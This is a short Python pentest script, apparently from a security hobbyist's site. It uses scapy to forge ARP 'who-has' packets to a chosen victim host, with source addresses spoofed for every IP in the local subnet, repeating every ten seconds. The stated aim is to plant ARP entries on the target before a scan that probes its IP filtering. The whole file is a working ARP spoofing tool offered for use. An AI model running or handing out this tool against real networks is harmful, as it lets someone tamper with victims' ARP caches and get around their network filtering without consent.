#!/usr/bin/env python
#
#Author: St0rn
#Website: http://storn.anbu-pentest.com and http://anbu-pentest.com
#
#Litle script used to add ARP entry before launch Filtrage IP discovery script (filtredscan.py)
#
#Usage: python arpentry.py device target
#

import sys
import os
import commands
import time
from scapy.all import *
 
ip_list=list()
ip=str()
 
def clear():
 os.system("clear")
 
def ip_truncation(ip_addr):
 count=0
 trunc=str()
 for i in ip_addr:
  if count < 3:    
   trunc+=i
   if i == ".":
    count+=1
   if count == 3:
    break
 return trunc
 
 
def generate_ips_list(device):
  ip = commands.getoutput(str('ifconfig ' +device+ ' | grep "inet addr:" | cut -d: -f2 | cut -d" " -f1'))
  for i in xrange(1,255):
   ip_list.append(ip_truncation(ip)+str(i))
 
 
def arpentry(victim, spoof):
 print "[*] Add ARP entries"
 vmac=getmacbyip(victim)
 for i in spoof:
  pck = Ether(dst=vmac)/ARP(op="who-has", psrc=i, pdst=victim)
  sendp(pck, iface_hint=spoof, verbose=0)
  os.write(1,".")
 print "\n[+] %s ARP Entries added\n" %(len(spoof))
 
 
if len(sys.argv) == 3:
 try:
  clear()
  generate_ips_list(sys.argv[1])
  while 1:
   arpentry(sys.argv[2], ip_list)
   print "\n[*] Waiting 10 seconds\n"
   time.sleep(10)
 except KeyboardInterrupt:
  print "\n\nInterrupt! Quit..\n"
  sys.exit(0)
else:
 clear()
 print "Usage: %s [device] [target]\n" %(sys.argv[0])
